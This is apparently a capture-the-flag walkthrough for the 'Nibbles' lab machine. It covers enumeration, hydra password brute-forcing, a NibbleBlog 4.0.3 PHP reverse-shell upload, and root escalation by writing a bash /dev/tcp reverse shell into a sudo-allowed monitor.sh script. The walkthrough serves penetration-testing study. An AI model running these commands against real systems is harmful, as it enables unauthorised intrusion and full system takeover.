* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

![alt text](./img/nibbles00.PNG?raw=true)  

## Recon-Enumeration  
nmap -A -v 10.10.10.75  
![alt text](./img/nibbles01.PNG?raw=true)  

gobuster dir -u http://10.10.10.75 -w ~/wordlists/big.txt -t 100 -e -x php,html,aspx,txt,log,xml  
![alt text](./img/nibbles02.PNG?raw=true)  

Ok, nothing important. Let’s check the page’s source code  
![alt text](./img/nibbles03.PNG?raw=true)  

Let’s access it  
![alt text](./img/nibbles04.PNG?raw=true)  

gobuster dir -u http://10.10.10.75/nibbleblog -w ~/wordlists/big.txt -t 100 -e -x php,html,aspx,txt,log,xml  
![alt text](./img/nibbles05.PNG?raw=true)  

Some curious options, but let's start with the most obvious….. admin.php  
![alt text](./img/nibbles06.PNG?raw=true)  

We can try some default credentials, but it will fail. So let’s check the login request with burp suite and send it to INTRUDER  
![alt text](./img/nibbles07.PNG?raw=true)  

After a feel requests capture we can check that the PHPSESSID doesn’t change, so we can set only the variables USERNAME and PASSWORD to be tested  
![alt text](./img/nibbles08.PNG?raw=true)  

However we have a problem, we don't know any username to improve our chances of success. So let’s see if we can found some help  

Visting the url “http://10.10.10.75/nibbleblog/README”, found with gobuster, we identify the app version  
![alt text](./img/nibbles10.PNG?raw=true)  

So let’s search for a exploit  
searchsploit nibble  
![alt text](./img/nibbles09.PNG?raw=true)  

Since i like to avoid metasploit at all costs (because OSCP rules) let’s enumerate harder visitng the other urls. Above are some findings  
http://10.10.10.75/nibbleblog/content/private/config.xml  
![alt text](./img/nibbles11.PNG?raw=true)  

http://10.10.10.75/nibbleblog/content/private/users.xml  
![alt text](./img/nibbles12.PNG?raw=true)  

Hummm so we have a sort of blacklist system with a fail_count. But now we have the username “admin”  

Let’s try to use burpsuite or hydra to discover this password  
hydra 10.10.10.75 -l admin -P ~/wordlists/rockyou.txt http-form-post "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password"-vV -f  
![alt text](./img/nibbles14.PNG?raw=true)  

Here we notice the blacklist it’s working properly, since we found 2 passwords for the same username

So let’s try to discover the password as old times…..manually  
We discover some information with the nibbleblog pages, so let’s try yo use it as credentials on the page http://10.10.10.75/nibbleblog/admin.php  
- admin:nibbleblog  
- admin:nibble  
- admin:yum  
- admin:yumyum  
- admin:nibbles ---> SUCESS  

![alt text](./img/nibbles15.PNG?raw=true)  

## Exploit  

Great, now looking on internet we can found a tutorial to how exploit nibbleblog 4.0.3  
https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html  

To keep it simple:  
- Login to nibbleblog  
- Activate MY IMAGE PLUGIN visiting: http://localhost/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image  
- Upload your shell  
- Visit: http://localhost/nibbleblog/content/private/plugins/my_image/shell.php  

![alt text](./img/nibbles16.PNG?raw=true)  

![alt text](./img/nibbles17.PNG?raw=true)  

For the shell i used the pentestmonkey php reverse shell, you can find it [HERE] (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or in kali /usr/share/webshells/php/php-reverse-shell.php  
![alt text](./img/nibbles18.PNG?raw=true)  

Start a netcat listener and click on image.php  
![alt text](./img/nibbles19.PNG?raw=true)  

HABEMUS SHELL \o/  

## Privesc  

Get a better shell:  
> python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  

sudo -l  
![alt text](./img/nibbles25.PNG?raw=true)  

Ok, let’s read this file….. but first we can found the first flag on /home/nibbler  
![alt text](./img/nibbles20.PNG?raw=true)  

Strange…. the personal folder doesn’t exist….. so we need to create the path to the monitor.sh file  
![alt text](./img/nibbles21.PNG?raw=true)  

Now let’s write an reverse shell code to the file and try to execute it. You can find great examples [HERE](https://gtfobins.github.io/)  
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.5/12345 <&1'" > monitor.sh  
cat monitor.sh  
![alt text](./img/nibbles22.PNG?raw=true)  

Start an netcat listener and run the above command  
sudo -u root /home/nibbler/personal/stuff/monitor.sh    
![alt text](./img/nibbles23.PNG?raw=true)  

And grab the flag  
![alt text](./img/nibbles24.PNG?raw=true)  
